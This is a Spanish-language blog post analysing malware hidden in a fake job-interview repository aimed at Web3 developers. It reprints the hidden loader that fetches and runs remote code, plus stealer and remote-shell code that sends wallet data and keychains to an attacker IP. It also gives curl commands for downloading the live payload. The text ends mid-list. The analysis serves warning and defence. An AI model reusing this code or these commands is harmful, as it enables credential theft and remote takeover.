---
title: "Ingeniería inversa del mal:\nEl caso del recruiter\ngeneroso (y falso)"
date: "2025-07-05"
author: "Leo Sagan"
excerpt: "Andabas buscando trabajo en la industria Web3, y terminaste perdiéndolo todo:\n
- Todos los ahorros\n
- Cuentas de todas las redes sociales\n
- Acceso a plataformas de pago\n
- Datos personales críticos
Esta no es una historia real, pero sí una potencialmente real."
description: "Estafas, engaños, ingeniería social y otras técnicas usadas para estafar a la gente haciéndoles entregar su información personal y dinero."
image: "https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/08ba24bc997f458b15d49f3f26bbc965a5b726d8/0.png"
tags: ["linkedin", "scams", "jobs", "web3 dev"]
language: "🇪🇸"
---

<!--
# Reverse Engineering of Evil:<br/>The Case of the Generous<br/>(and Fake) Recruiter

<div style="text-align:center">
  <img
 width="66%"  src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/08ba24bc997f458b15d49f3f26bbc965a5b726d8/0.png" alt="cover" />
<br/>
By LeoSagan (x.com/ethsagan)
<br/>
</div>

-->

<div style="display: flex; justify-content: center; gap: 10px; flex-wrap: wrap;">

[![Nivel de amenaza](https://img.shields.io/badge/Nivel%20de%20amenaza-CRITICA-red)](https://github.com) [![Tipo de malware](https://img.shields.io/badge/Tipo-Stealer%20%2B%20RAT-lightgray)](https://github.com) [![Plataformas](https://img.shields.io/badge/Plataformas-Windows%20%7C%20macOS%20%7C%20Linux-lightgray)](https://github.com)

</div>

<br/>

```
 ⚠️ La suma de todos los miedos online:

Andabas buscando laburo en la industria Web3, y terminaste perdiéndolo todo:

- Ahorros de todas las cuentas
- Cuentas de todas las redes sociales
- Acceso a plataformas de pago
- Datos personales críticos

Esta no es una historia real, pero sí una **potencialmente real**.
```

<br/>

## INTRODUCCIÓN

Cada vez que vemos alertas como "código malicioso detectado" o "malware detectado", paramos ahí, borramos el archivo y listo. No sabemos qué era, o qué pretendía hacer, pero seguramente era algo maligno. Nos vemos en la próxima.

### Pero ahora, vamos a tener la certeza de qué tan maligno era.

<br/>

### TL;DR

| Fase                    | Descripción                                                                     | Riesgo         |
| ----------------------- | ------------------------------------------------------------------------------- | -------------- |
| Contacto Inicial        | Recruiter/CTO/COO te contacta ofreciendo puesto con salario llamativamente alto | 💤 Bajo        |
| Descripción del Trabajo | Manda descripción que parece perfecta para tu perfil                            | 💤 Bajo        |
| Entrevista Rápida       | Charla breve, confirma que sos "ideal" para el puesto                           | 👀 Medio       |
| Prueba Técnica          | Te pide que clones su repositorio para hacer modificaciones como test técnico   | 🔴 Alto        |
| Ejecución               | Su código aparentemente inofensivo es **un pasaje directo a la ruina**          | 💀 **CRÍTICO** |

### Este análisis te va a mostrar:

- Qué hace exactamente el malware
- Cómo identificar estas amenazas
- Cómo defenderte efectivamente

<br/>

---

## 📑 ÍNDICE

- [🔍 ANTECEDENTES](#-antecedentes)
- [🎯 RESUMEN DE LA AMENAZA](#-resumen-de-la-amenaza)
- [🔍 CONTEXTO Y DESCUBRIMIENTO](#-contexto-y-descubrimiento)
- [🕷️ EL REPOSITORIO MALICIOSO](#️-el-repositorio-malicioso)
- [🔬 ANÁLISIS COMPLETO DEL MALWARE](#-análisis-completo-del-malware)
- [🎭 PERFILADO DE VÍCTIMAS](#-perfilado-de-víctimas)
- [🌐 INFRAESTRUCTURA DEL ATACANTE](#-infraestructura-del-atacante)
- [🛡️ DETECCIÓN Y CONTRAMEDIDAS](#️-detección-y-contramedidas)
- [⚡ RECOMENDACIONES URGENTES](#-recomendaciones-urgentes)
- [📝 CONCLUSIONES](#-conclusiones)

<br/>

## 🔍 ANTECEDENTES

> ### 💭 _"Así como vos te la pasás 24 horas al día pensando en cómo mejorar, progresar y hacer el bien, hay otros que se la pasan 24 horas al día pensando en cómo hacer el mal."_

### La evolución del cibercrimen

Después de casi una década trabajando en la industria blockchain, observé una **infinidad de estafas, engaños e intentos de ingeniería social**. Lo preocupante es que últimamente se han perfeccionado exponencialmente:

- **Antes:** Estafas aburridas, toscas y fácilmente detectables
- **Ahora:** Ataques de ingeniería social, específicamente dirigidos a personas/sistemas vulnerables con ayuda de poderosas herramientas de IA
- **Vector principal:** Ofertas de trabajo tentadoras, aunque a veces exageradas, listas para capturar usuarios desprevenidos.

### El caso de estudio

La semana pasada, me contactó un supuesto **founder & CEO** con un perfil aparentemente legítimo:

- ✅ **500+ conexiones** en LinkedIn
- ✅ **Recomendaciones** de otros usuarios
- ✅ **Contactos en común** verificables, algunos conocidos IRL
- ✅ había laburado en algunas instituciones/universidades prestigiosas, pero como sabemos, en LinkedIn uno puede poner que fue presidente de la Tierra y nadie va a decir lo contrario.

Aunque también tenía algunas banderas rojas:

- ❌ **Pocas** interacciones con otros usuarios, y muy dudosas
- ❌ **Ninguna** participación en eventos, ni publicaciones
- ❌ No fue posible verificar su existencia real por otros medios

Aún así, me tomé la tarea de **destripar completamente** su estrategia para determinar el alcance real de la amenaza.

### Disección del modus operandi

Lo que encontré fue una verdadera **ingeniería del mal**:

> 🚨 **La supuesta oferta de trabajo era un mecanismo perverso y sofisticado de control sistémico**

**No se trataba solo de robar billeteras cripto y credenciales.** Eso era solo el punto de entrada. Las cosas se iban a poner **exponencialmente peor**.

<br/>

---

## 🎯 RESUMEN DE LA AMENAZA

### Información Básica

| Atributo               | Detalle                                                                              |
| ---------------------- | ------------------------------------------------------------------------------------ |
| **Vector Original**    | Ofertas de trabajo falsas en LinkedIn (ellos te contactan primero)                   |
| **Objetivos**          | 22+ billeteras cripto + credenciales de navegador + control remoto total             |
| **Sistemas Afectados** | Windows, macOS, Linux                                                                |
| **Severidad**          | ![Critica](https://img.shields.io/badge/CRITICA-red) Pérdida total + RAT persistente |
| **Servidor C&C**       | `144.172.105.189` (múltiples puertos)                                                |

### Capacidades Principales

| Capacidad                  | Descripción                                         | Impacto    |
| -------------------------- | --------------------------------------------------- | ---------- |
| Robo Masivo de Billeteras  | 22+ extensiones de navegador como objetivo          | 💀 Crítico |
| Extracción de Credenciales | Contraseñas guardadas en navegadores                | 🔴 Alto    |
| Control Remoto Completo    | RAT vía Socket.IO                                   | 💀 Crítico |
| Persistencia               | Descarga e instalación de payload adicional         | 🔴 Alto    |
| Monitoreo de Portapapeles  | Captura direcciones de billeteras en tiempo real    | 🔴 Alto    |
| Evasión                    | Múltiples técnicas anti-análisis/ofuscación         | 🔶 Medio   |
| Perfilado Integral         | Virtualización, horarios, geolocalización, patrones | 🔶 Medio   |

### Distribución del Impacto

- Pérdidas Financieras: 40%
- Control de Sistema: 30%
- Robo de Credenciales: 20%
- Persistencia: 10%

### Billeteras y Plataformas Objetivo

| Tipo                     | Ejemplos                          | Riesgo         |
| ------------------------ | --------------------------------- | -------------- |
| **Billeteras Calientes** | MetaMask, Phantom, Trust Wallet   | 💀 **Crítico** |
| **Billeteras Exchange**  | Extensiones Coinbase, Binance     | 💀 **Crítico** |
| **Billeteras Desktop**   | Exodus, Solana CLI                | 🔴 **Alto**    |
| **Navegadores**          | Credenciales Chrome, Brave, Opera | 🔴 **Alto**    |

<br/>

---

## 🔍 CONTEXTO Y DESCUBRIMIENTO

### El Modus Operandi

El **supuesto recruiter** (a veces autodesignado tech lead o C-level) inicia contacto siguiendo este patrón:

- Contacto por LinkedIn
- Oferta de trabajo atractiva
- Descripción de trabajo personalizada
- Llamada corta sin cámara
- Desafío técnico
- Clonado/descarga de repositorio
- Ejecución de malware

Todo empieza con algo así:

<div style="text-align:center">
  <img 
 width="66%"  src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/33.png" alt="invite" />
</div>

<br/>
    
---

### Preparación para el Análisis

> ⚠️ **DISCLAIMER:** Este procedimiento debe realizarse con **extrema precaución** en un entorno completamente aislado.

#### Requisitos de Seguridad

| Componente     | Requisito                      |                                            |
| -------------- | ------------------------------ | ------------------------------------------ |
| Hardware       | Equipo dedicado/aislado        | Sin datos personales, valiosos o sensibles |
| Virtualización | ⚠️ Puede ser contraproducente  | **Spoiler:** Te van a perfilar             |
| Conexión       | Múltiples capas VPN + Firewall | Máximo anonimato y protección              |
| OS             | Linux/BSD exótico              | **⚠️ NUNCA** Windows o MacOS               |

🎯 **Mientras más exótico el sistema operativo, menor el riesgo**. ¿Podría esto potencialmente aumentar tu puntuación en el perfilado? Puede ser, pero igual podemos modificar el "user agent" para evitar sospechas.

Ejemplos de distribuciones recomendadas para el estudio:

```bash
- Qubes OS (máximo aislamiento)
- Tails (máximo anonimato)
- OpenBSD (máxima seguridad)
- Alpine Linux (mínima superficie de ataque)
```

#### Recordatorio Crítico

⚠️ Estamos enfrentando una amenaza desconocida
❓ No conocemos sus métodos completos
❓ No conocemos sus capacidades reales
❓ No entendemos su fuerza total

Mantenerse alerta y no subestimar el riesgo es CRÍTICO

<br/>

---

## 🕷️ EL REPOSITORIO MALICIOSO

🚨 DISCLAIMER: No clonen ni descarguen, publicado solo con fines ilustrativos 🚨

🕷️ https://gitlab.com/technical-assessment4/Rental-Platform 🕷️

- Para cuando leas esto, puede que ya lo hayan borrado, pero hay cientos de forks y clones circulando
- Generalmente es privado, por lo que te piden tu usuario de Github/Gitlab/Bitbucket para mandarte la invitación. De paso, van a conocer tu actividad de GitHub y refinar tu perfilado (🚩)
- Es bastante extenso, con muchos archivos, dependencias, scripts, e incluso archivos `.env` ya populados (después profundizo en esto). Suele contener estructuras complejas de frontend, backend, contratos, etc. La idea es dar apariencia de un desarrollo importante y "marearte" en la arquitectura compleja y una miríada de carpetas.

<div style="text-align:center">
<br/>
  <img   src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/4.png" alt="folder structure" />
</div>

<br/>

Y este es el sujeto en cuestión 👇

<div style="text-align:center">
  <img 
 width="50%"  src="https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/08ba24bc997f458b15d49f3f26bbc965a5b726d8/1.png" alt="culprit" />
</div>

<br/>

- Un vistazo rápido al `package.json` no revela nada sospechoso, excepto por esto:

```json
"scripts": {
    "predeploy": "concurrently \"node server/server.js\" \"npm run build\"",
    "deploy": "concurrently \"node server/server.js\" \"gh-pages -d build\"",
    "start": "concurrently \"node server/server.js\" \"react-scripts start\"",
    "build": "concurrently \"node server/server.js\" \"react-scripts build\"",
    "test": "concurrently \"node server/server.js\" \"react-scripts test\"",
    "eject": "concurrently \"node server/server.js\" \"react-scripts eject\""
  },
```

Lo que indica que `server/server.js` se ejecuta sin importar el comando usado. Ya vamos a ver por qué (🚩).

Todos los scripts en package.json usan `concurrently` que llama a `node server/server.js`, y que a su vez importa `app.js`:

```javascript
"start": "concurrently \"node server/server.js\" \"react-scripts start\""
```

Entonces si se usa `npm start` o `npm run start`, ejecuta:

- `node server/server.js` >
- `react-scripts start` >
- `app.js` >
- `initAppBootstrap(); // 🏴‍☠️ 🚩 Se ejecuta sin condiciones`

🚨 **Esta función aparentemente inocente es el punto de entrada a un sofisticado sistema de control remoto.
Desde acá, empezamos el análisis detallado de lo que hace realmente el malware.**

<br/>

---

## 🔬 ANÁLISIS COMPLETO DEL MALWARE

En esta sección, vamos a analizar paso a paso cómo funciona este stealer sofisticado, desde su punto de entrada hasta sus capacidades más avanzadas.

### Punto de Entrada Malicioso

Una vez que se ejecuta cualquier script `npm`, `initAppBootstrap()` se lanza automáticamente. Veamos qué hace:

```javascript
const initAppBootstrap = async () => {
  try {
    const src = atob(process.env.DEV_API_KEY);
    const k = atob(process.env.DEV_SECRET_KEY);
    const v = atob(process.env.DEV_SECRET_VALUE);
    const s = (await axios.get(src, { headers: { [k]: v } })).data;
    const handler = new Function.constructor("require", s);
    handler(require);
  } catch (error) {
    console.log(error);
  }
};
```

A primera vista, no parece muy malicioso, solo son variables de entorno que contienen las API keys para usar después, pero si miramos el archivo `.env`, vamos a ver que está **_extrañamente completo_**:

```bash
DEV_APP_URL = "http://localhost:4000"
SPARKPOST_API_KEY = "ca184ac5f2e659ee65272911f6b0795586e15b20"
DEV_SERVER_PORT = 4000
DEV_DB_HOST = "localhost"
DEV_DB_USER = "root"
DEV_API_KEY="aHR0cHM6Ly9icy1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL29u"
DEV_SECRET_KEY="eC1zZWNyZXQta2V5"
DEV_SECRET_VALUE="Xw=="
```

Nada raro, no?<br/>
Por qué alguien sería tan amable de darte las API keys ya cargadas?<br/>
Bueno, si usamos la magia del decoding `base64`, vamos a ver cómo se revela el crimen:

```bash
DEV_API_KEY="aHR0cHM6Ly9icy1wcm9kdWN0aW9uLnVwLnJhaWx3YXkuYXBwL29u"
# Decodifica a: https://bs-production.up.railway.app/on 🚩🚩🚩

DEV_SECRET_KEY="eC1zZWNyZXQta2V5"
# Decodifica a: x-secret-key

DEV_SECRET_VALUE="Xw=="
# Decodifica a: _
```

Ahí está 🚩🚩🚩:
https://bs-production.up.railway.app/on <br/>
¿Por qué cuernos está codificada esta URL en una variable de entorno?

- Esta es la URL del servidor Command and Control. Para hackearte.

Limpio, el código se ve más o menos así:

```javascript
const initAppBootstrap = async () => {
  try {
    // 🚩 PASO 1: Decodificar variables de entorno desde base64
    const src = atob(process.env.DEV_API_KEY); // URL del servidor C&C
    const k = atob(process.env.DEV_SECRET_KEY); // Nombre del header de autenticación
    const v = atob(process.env.DEV_SECRET_VALUE); // Valor del header de autenticación

    // 🚩🚩 PASO 2: Descargar payload desde servidor remoto
    const s = (await axios.get(src, { headers: { [k]: v } })).data;

    // 🚩🚩🚩 PASO 3: Ejecutar el código descargado con acceso completo al sistema
    const handler = new Function.constructor("require", s);
    handler(require);
  } catch (error) {
    console.log(error); // Silenciar errores para no alertar a la víctima
  }
};
```

Y ahí están, las variables de entorno decodificadas.
**_El bastardo guardó la URL y las claves de autenticación en variables de entorno._**

Mientras tanto, notamos que:

- Usando `atob` decodificamos la variable de entorno `DEV_API_KEY` a una URL oculta
- `Function.constructor` es equivalente a `eval()` pero menos notorio para el ojo inexperto
- Usa headers HTTP personalizados para autenticación
- Permite al atacante cambiar el payload sin modificar el código local
- El código descargado tiene acceso completo al objeto `require` de Node.js. Permite ejecución arbitraria de JS desde un servidor remoto

Ya vamos a ver por qué (🚩).

### Otros archivos potencialmente sospechosos aka `ofuscación extrema`

Después de verificar _todos_ los archivos (!), noté otro patrón interesante en `imageCompressor.js`: _código minificado sospechoso_

```javascript
// La versión deofuscada sería:
const Jimp = require("jimp");
const path = require("path");

module.exports = async (filename, width, inputPath, outputDir, subfolder) => {
  try {
    const image = await Jimp.read(inputPath);
    await image
      .resize(width, Jimp.AUTO)
      .write(path.resolve(outputDir, subfolder, filename));
    return `${subfolder}/${filename}`;
  } catch (error) {
    console.log("Error reducing size / converting image: ", error);
  }
};
```

Aunque este archivo parece legítimo, la ofuscación extrema es red flag.
A qué deberíamos prestar atención en este sentido?

- Archivos innecesariamente minificados/ofuscados (ya que no pasarían un linting)
- Archivos con una estructura de código muy diferente a otros
- Múltiples niveles de carpetas, innecesarios, pero escondiendo el código malicioso en alguna rama
- Archivos con cientos de espacios en blanco (visibles luego de scroll horizontal), terminando con un `require()` malicioso

Además, este malware usó estrategias de evasión:

- Nombres legítimos: `bootstrap.js` parece un archivo normal
- Try-catch silencioso: Los errores no se muestran a la víctima
- Ejecución condicional: Solo se ejecuta si las variables están definidas
- Mezclado con código real: El proyecto tiene funcionalidad real para parecer legítimo

### Evaluando a la víctima

A esta altura, la URL del criminal ya fue reportada apropiadamente.

Hasta este punto, hemos visto que el malware es sofisticado y capaz de pasar desapercibido. Pero solo vimos la mitad, la parte verdaderamente maliciosa es la que se descarga y ejecuta.

> ### 🚩🚩🚩 Niños, no hagan esto en casa. No lo hagan!

Solo con fines educativos, voy a mostrar exactamente qué haría una vez descargado, va a haber variaciones en el modus operandi y código. Si uno quisiera diseccionarlo de nuevo, recomiendo hacerlo en un entorno aislado, algunas alternativas rápidas son:

1. CodeSandbox
   URL: https://codesandbox.io/
   Crea un sandbox de "Node.js"
   Terminal integrado disponible
2. Glitch
   URL: https://glitch.com/
   Terminal en el navegador
   Servidores en la nube
3. GitHub Codespaces
   URL: https://github.com/codespaces
   Terminal completo en el navegador
   IP de GitHub, no la tuya
4. Google Colab (con comandos shell)
   URL: https://colab.research.google.com/
   Usa !curl en las celdas
   IP de Google Cloud

### Pasos para CodeSandbox (opción más rápida)

- Crear una cuenta de mail temporal (ej., 10minutemail.com)
- Cuando aparezca el Editor, abrir su terminal y ejecutar:

```bash
# Ejecutar análisis
curl -s -v -H "x-secret-key: _" "https://bs-production.up.railway.app/on" 2>&1 | tee malware_analysis.txt

# Ver contenido
cat malware_analysis.txt
```

Alternativa con máximo anonimato: proxy chains

```bash
curl -s --proxy $(curl -s "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all" | head -1) -H "x-secret-key: _" "https://bs-production.up.railway.app/on"
```

Produce una salida ilegible:

![Image](https://gist.github.com/raiseerco/37f8abf7feb71663c95390d36c2e5513/raw/7163dba2da784c109ac305b8616f6a4177633e05/5.png)

De esta manera, habrás descargado el malware y entonces, comenzaremos con la disección.

### Algunas técnicas empleadas:

Es un archivo JS de casi 2kb, altamente ofuscado, inicialmente usé `deobfuscate.io` pero sorpresivamente recibí un mensaje como este:

```
Notificación
Tu código parece que ha sido ofuscado usando Obfuscator.io, ¿te gustaría ir al deofuscador específico para eso?
```

Así que la herramienta me redirigió a `https://obf-io.deobfuscate.io/` que funcionó y devolvió un código más legible.

¿Qué encontré?

```javascript
 const homeDir = os.homedir();
  const tmpDir = os.tmpdir();
  const fs_promises = require("fs/promises");
  const getAbsolutePath = (_0x416b16) =>
    _0x416b16.replace(/^~([a-z]+|\/)/, (_0x227b5c, _0x47f187) =>
      "/" === _0x47f187 ? homeDir : path.dirname(homeDir) + "/" + _0x47f187
    );
  function testPath(_0x3e6c41) {
    try {
      fs.accessSync(_0x3e6c41);
      return true;
    } catch (_0x1caf4f) {
      return false;
    }
  }
  const R = [
    "Local/BraveSoftware/Brave-Browser",
    "BraveSoftware/Brave-Browser",
    "BraveSoftware/Brave-Browser",
  ];
  const Q = ["Local/Google/Chrome", "Google/Chrome", "google-chrome"];
  const X = [
    "Roaming/Opera Software/Opera Stable",
    "com.operasoftware.Opera",
    "opera",
  ];
  const Bt = [
    "nkbihfbeogaeaoehlefnkodbefgpgknn",
    "ejbalbakoplchlghecdalmeeeajnimhm",
    "fhbohimaelbohpjbbldcngcnapndodjp",
    "ibnejdfjmmkpcnlpebklmnkoeoihofec",
    "bfnaelmomeimhlpmgjnjophhpkkoljpa",
    "aeachknmefphepccionboohckonoeemg",
    "hifafgmccdpekplomjjkcfgodnhcellj", ...
```

- Nombres de variables hexadecimales (`_0x8d2ecb`, `_0x1d2535`)
- Funciones auto-ejecutables anidadas
- Strings fragmentados
- Anti-debugging integrado

---

### Arquitectura del Malware

Tiene una arquitectura modular sofisticada con tres componentes principales que trabajan juntos.

#### 🔧 Módulo Principal (Líneas 1-600)

Ya con ver que usa `child_process` nos da la certeza de que algo realmente malo va a pasar.

```javascript
const fs = require("fs");
const os = require("os");
const path = require("path");
const request = require("request");
const ex = require("child_process").exec;
const hostname = os.hostname();
const platform = os.platform();
const homeDir = os.homedir();
```

#### 🎮 Módulo de Control Remoto (Líneas 1000-1171)

La suma de todos los miedos: El código de control remoto es realmente malicioso, y eso es exactamente lo que nos va a pasar.

```javascript
makeLog("Installing socket.io-client");
execSync(
  "npm install socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent",
  { windowsHide: true }
);
let io = require("socket.io-client");
```

Acá, se instala `socket.io-client`, que es un paquete de Node.js que permite comunicación entre nodos, y que se usa para la comunicación entre el malware y el servidor remoto.

#### 🦊 Módulo de Búsqueda de Wallets (Líneas 95-400)

La constante `Bt` es reveladora:

```javascript
const Bt = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
  "ejbalbakoplchlghecdalmeeeajnimhm", // MetaMask Legacy
  "fhbohimaelbohpjbbldcngcnapndodjp", // Trust Wallet
  // ... y 19 wallets más!!
];
```

Contiene una lista de IDs de extensiones de navegador de las wallets más populares. Cada vez que instalás una o cuando la abrís en pantalla completa, vas a notar que la URL dice algo como `chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html` (para el caso de MetaMask).<br/>
Ese `nkbihfbeogaeaoehlefnkodbefgpgknn` es precisamente el ID de MetaMask, que está hardcodeado, junto con muchas wallets más.

### Lista Completa de Wallets Objetivo

| ID de Extensión                    | Billetera       | Plataforma        | Riesgo  |
| ---------------------------------- | --------------- | ----------------- | ------- |
| `nkbihfbeogaeaoehlefnkodbefgpgknn` | MetaMask        | Chrome/Brave/Edge | CRÍTICO |
| `ejbalbakoplchlghecdalmeeeajnimhm` | MetaMask Legacy | Chrome/Brave      | CRÍTICO |
| `fhbohimaelbohpjbbldcngcnapndodjp` | Trust Wallet    | Chrome/Brave      | CRÍTICO |
| `ibnejdfjmmkpcnlpebklmnkoeoihofec` | TronLink        | Chrome/Brave      | CRÍTICO |
| `bfnaelmomeimhlpmgjnjophhpkkoljpa` | Phantom         | Chrome/Brave      | CRÍTICO |
| `aeachknmefphepccionboohckonoeemg` | Coin98 Wallet   | Chrome/Brave      | ALTO    |
| `hifafgmccdpekplomjjkcfgodnhcellj` | Crypto com      | Chrome/Brave      | ALTO    |
| `jblndlipeogpafnldhgmapagcccfchpi` | Keplr           | Chrome/Brave      | ALTO    |
| `acmacodkjbdgmoleebolmdjonilkdbch` | Guarda          | Chrome/Brave      | ALTO    |
| `dlcobpjiigpikoobohmabehhmhfoodbb` | Argent X        | Chrome/Brave      | ALTO    |
| `mcohilncbfahbmgdjkbpemcciiolgcge` | OKX Wallet      | Chrome/Brave      | CRÍTICO |
| `agoakfejjabomempkjlepdflaleeobhb` | Sui Wallet      | Chrome/Brave      | ALTO    |
| `omaabbefbmiijedngplfjmnooppbclkk` | CloverWallet    | Chrome/Brave      | MEDIO   |
| `aholpfdialjgjfhomihkjbmgjidlcdno` | Wombat          | Chrome/Brave      | MEDIO   |
| `nphplpgoakhhjchkkhmiggakijnkhfnd` | Ton Wallet      | Chrome/Brave      | ALTO    |
| `penjlddjkjgpnkllboccdgccekpkcbin` | Nami            | Chrome/Brave      | ALTO    |
| `lgmpcpglpngdoalbgeoldeajfclnhafa` | Eternl          | Chrome/Brave      | ALTO    |
| `fldfpgipfncgndfolcbkdeeknbbbnhcc` | XDEFI Wallet    | Chrome/Brave      | ALTO    |
| `bhhhlbepdkbapadjdnnojkbgioiodbic` | Solflare        | Chrome/Brave      | ALTO    |
| `gjnckgkfmgmibbkoficdidcljeaaaheg` | Slope Wallet    | Chrome/Brave      | ALTO    |
| `afbcbjpbpfadlkmhmclhkeeodmamcflc` | Math Wallet     | Chrome/Brave      | MEDIO   |

> 💡 **Total: 20+ wallets** identificadas como objetivos principales

### Sistema de Control Remoto vía Socket.io

#### Instalación automática:

```javascript
makeLog("Installing socket.io-client");
execSync(
  "npm install socket.io-client --save --no-warnings --no-save --no-progress --loglevel silent",
  { windowsHide: true }
);
let io = require("socket.io-client");
```

#### Conexión:

```javascript
const socket = io("http://144.172.105.189:4661", {
  reconnectionAttempts: 15,
  reconnectionDelay: 2000,
  timeout: 2000,
});
```

#### Ejecución de comandos remotos:

```javascript
socket.on("command", (msg) => {
  exec(
    msg.message,
    { windowsHide: true, maxBuffer: 1024 * 1024 * 300 },
    (error, stdout, stderr) => {
      if (error) {
        socket.emit("message", {
          result: error.message,
          ...msg,
          uid: uid,
          type: "error",
        });
        return;
      }
      socket.emit("message", {
        ...msg,
        result: stdout,
        uid: uid,
      });
    }
  );
});
```

#### Esto va a resultar en que el atacante remoto pueda ejecutar cualquier comando que quiera, como si estuvieran sentados frente a tu computadora, sin abrir una ventana (gracias a `windowHide:true`) y van a poder obtener el resultado en su máquina.

<br/>

---

### Robo de Datos de Wallets

#### Extracción:

```javascript
const uploadFiles = async (_0x87ab6a, _0x53011f, _0x3a0da2, _0x4b5d3b) => {
  for (let _0x391096 = 0; _0x391096 < 200; _0x391096++) {
    const _0x248003 =
      _0x87ab6a +
      "/" +
      (0 === _0x391096 ? "Default" : "Profile " + _0x391096) +
      "/Local Extension Settings";

    for (let _0x59bf21 = 0; _0x59bf21 < Bt.length; _0x59bf21++) {
      let _0x2d650a = _0x248003 + "/" + Bt[_0x59bf21];
      if (testPath(_0x2d650a)) {
        // Extracción de archivos .log y .ldb
        if (_0x1011c7.includes(".log") || _0x1011c7.includes(".ldb")) {
          _0x21aea7.push({
            value: fs.createReadStream(_0x1011c7),
            options: _0x141f82,
          });
        }
      }
    }
  }
};
```

Esta función va a buscar todos los archivos `.log` y `.ldb`, y subirlos al servidor remoto.

#### Robo de Exodus:

```javascript
const uploadEs = (_0x5d45cf) => {
  let _0x1fabf7 = "";
  if ("w" == platform[0]) {
    _0x1fabf7 = getAbsolutePath("~/") + "/AppData/Roaming/Exodus/exodus.wallet";
  } else if ("d" == platform[0]) {
    _0x1fabf7 =
      getAbsolutePath("~/") + "/Library/Application Support/exodus.wallet";
  } else {
    _0x1fabf7 = getAbsolutePath("~/") + "/.config/Exodus/exodus.wallet";
  }
};
```

#### Robo de archivos de Solana:

```javascript
if (
  _0x3a0da2 &&
  ((_0x23268a = homeDir + "/.config/solana/id.json"), fs.existsSync(_0x23268a))
) {
  try {
    const _0x26a148 = {
      filename: "solana_id.txt",
    };
    _0x21aea7.push({
      value: fs.createReadStream(_0x23268a),
      options: _0x26a148,
    });
  } catch (_0x24237b) {}
}
```

#### Servidor de Subida de Archivos

```javascript

const Upload = (_0x5f0e9c, _0x769ab6) => {
  const _0x2303f0 = {
    type: "106",
    hid: "212_" + hostname,
    uts: _0x769ab6,
    multi_file: _0x5f0e9c,
  };
  try {
    if (_0x5f0e9c.length > 0) {
      const _0x2d5a53 = {
        url: "http://144.172.105.189:1224/uploads",
        formData: _0x2303f0,
      };
      request.post(_0x2d5a53, (_0x414814, _0x46a43c, _0x54fe86) => {});
    }
  }
}
```

### Monitoreo del Portapapeles

Captura de contenido del portapapeles:

- macOS: Usa el comando `pbpaste`
- Windows: Usa el comando del powershell `Get-Clipboard`
- Monitoreado cada 500ms
- Automaticamente envia todos los contenidos copiados al servidor
- Detección de copiado de criptodirecciones

#### Captura en MacOS

```javascript
if (os.platform() == "darwin") {
  exec(
    "pbpaste",
    { windowsHide: true, stdio: "ignore" },
    (error, stdout, stderr) => {
      currentClipboardContent = stdout.trim();
      if (currentClipboardContent !== lastClipboardContent) {
        handleClipboardChange(currentClipboardContent);
        lastClipboardContent = currentClipboardContent;
      }
    }
  );
}
```

#### Captura en Windows

```javascript
else if(os.platform() == "win32"){
  exec("powershell Get-Clipboard", {windowsHide: true, stdio: "ignore"},
    (error, stdout, stderr) => {
      currentClipboardContent = stdout.trim();
      if (currentClipboardContent !== lastClipboardContent) {
        handleClipboardChange(currentClipboardContent);
      }
    })
}
```

#### Robo de Keychain (MacOS)

No satisfecho con todo lo anterior, algo realmente crítico es el robo de la Keychain de MacOS:

```javascript
const UpKeychain = async (_0x332023) => {
  let _0xcd51e3 = [];
  let _0x50fa57 = homeDir + "/Library/Keychains/login.keychain";
  if (fs.existsSync(_0x50fa57)) {
    try {
      const _0x459b00 = {
        filename: "logkc-db",
      };
      _0xcd51e3.push({
        value: fs.createReadStream(_0x50fa57),
        options: _0x459b00,
      });
    } catch (_0xf6507f) {}
  }

```

#### **Una vez establecida la conexión con el servidor C&C, el malware comienza una recopilación exhaustiva de información sobre la víctima para maximizar el valor del ataque.**

<br/>

---

## 🎭 PERFILADO DE VÍCTIMAS

El malware realiza un análisis exhaustivo de cada víctima para determinar su valor como objetivo y personalizar el ataque de forma asincrónica. No descarto que esta información se guarde en alguna base de datos del atacante, lo que allana el camino para el perfeccionamiento de sus herramientas. El malware puede permanecer inactivo, sin actividad, por tiempo indefinido, a la espera de la orden de activación remota.

El atacante puede extrer esta información de la víctima:

- Info completa del sistema operativo
- Platforma (Windows/Mac/Linux)
- Version
- Hostname
- Nombre de usuario, uid, gid, shell, homedir, etc.
- UID único para identificar la víctima

```javascript
socket.on("whour", (msg) => {
  socket.emit("whoIm", {
    OS: os.type(),
    platform: os.platform(),
    release: os.release(),
    host: os.hostname(),
    userInfo: os.userInfo(),
    uid: uid,
    t: "6",
  });
});
```

También verifica si está ejecutándose en una VM:

```javascript
else if (os.platform() == "linux") {
  let output = fs.readFileSync("/proc/cpuinfo", "utf8").toLowerCase();
  if (/hypervisor|vmware|virtualbox|qemu|kvm|xen|parallels|bochs/.test(output)) {
    isVM = true;
  }
}
```

¿Por qué esto es importante?

> Estar en una VM puede indicarle al atacante que sos un objetivo de alto valor, o un especialista en opSec... u otro hacker 😅

### A TENER EN CUENTA:

Esta es una lista no exhaustiva de cosas que podrían ser detectadas:

1. Perfil del sistema

```javascript
uid: "5d41402abc4b2a76b9719d911017c592"; // ID único del malware, el atacante sabe qué instancia
hostname: os.hostname(); // Nombre de la máquina
```

- Características de Hardware/Software:
  ```javascript
  OS: os.type(); // Windows/Linux/Darwin (mac)
  platform: os.platform(); // win32/linux/darwin
  release: os.release(); // Versión del OS
  userInfo: os.userInfo(); // Nombre de usuario, uid, gid, shell, homedir
  ```
- Detección de entorno:
  - Físico vs Virtual: " (VM)" vs "(Local)"
  - Tipo de virtualización: VMware, VirtualBox, QEMU, KVM, Xen, Parallels, Bochs

2. Perfil de usuario/comportamiento

- Navegadores instalados y usados:
  - Chrome (perfiles 0-199)
  - Brave Browser
  - Opera
  - Firefox
  - Microsoft Edge
- Actividad financiera/cripto:
